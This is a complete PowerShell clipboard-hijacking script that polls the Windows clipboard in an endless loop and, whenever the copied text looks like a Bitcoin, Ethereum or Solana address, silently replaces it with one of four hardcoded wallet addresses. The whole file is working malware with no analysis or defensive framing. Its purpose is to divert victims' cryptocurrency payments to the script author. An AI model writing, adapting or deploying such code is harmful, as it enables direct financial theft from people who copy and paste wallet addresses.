Add-Type -AssemblyName System.Windows.Forms

$myBtcBech32 = "bc1qktqlt633t02x57sc8v5xseahysmz4j963lkl83"
$myBtcTaproot = "bc1pneq6d9rrpnhu5xpa8a6whhzjeku74r7yunnnnq27k0tqv6l0qjmsf4g8uf"
$myEth = "0x2fd35c82Eb26da57cF630314C031695343aCbC57"
$mySol = "7fdf9h4fzL4uJJS6kKaBbA1qFyvWGYkH7b9h9F9oRwTS"

$btcLegacyRegex = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'
$btcBech32Regex = '(?i)^bc1q[a-z0-9]{38,87}$'
$btcTaprootRegex = '(?i)^bc1p[a-z0-9]{38,87}$'
$ethRegex = '(?i)^0x[a-f0-9]{40}$'
$solRegex = '^[1-9A-HJ-NP-Za-km-z]{32,44}$'

while ($true) {
    try {
        $clipText = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipText) {
            $clipText = $clipText.Trim()
            if ($clipText -ne '' -and $clipText -ne $myBtcBech32 -and $clipText -ne $myBtcTaproot -and $clipText -ne $myEth -and $clipText -ne $mySol) {
                if ($clipText -match $ethRegex) {
                    [System.Windows.Forms.Clipboard]::SetText($myEth)
                }
                elseif ($clipText -match $btcTaprootRegex) {
                    [System.Windows.Forms.Clipboard]::SetText($myBtcTaproot)
                }
                elseif ($clipText -match $btcBech32Regex) {
                    [System.Windows.Forms.Clipboard]::SetText($myBtcBech32)
                }
                elseif ($clipText -match $btcLegacyRegex) {
                    [System.Windows.Forms.Clipboard]::SetText($myBtcBech32)
                }
                elseif ($clipText -match $solRegex -and $clipText -notmatch '^0x' -and $clipText -notmatch '^[13]' -and $clipText -notmatch '(?i)^bc1') {
                    [System.Windows.Forms.Clipboard]::SetText($mySol)
                }
            }
        }
    } catch {}
    Start-Sleep -Milliseconds 300
}
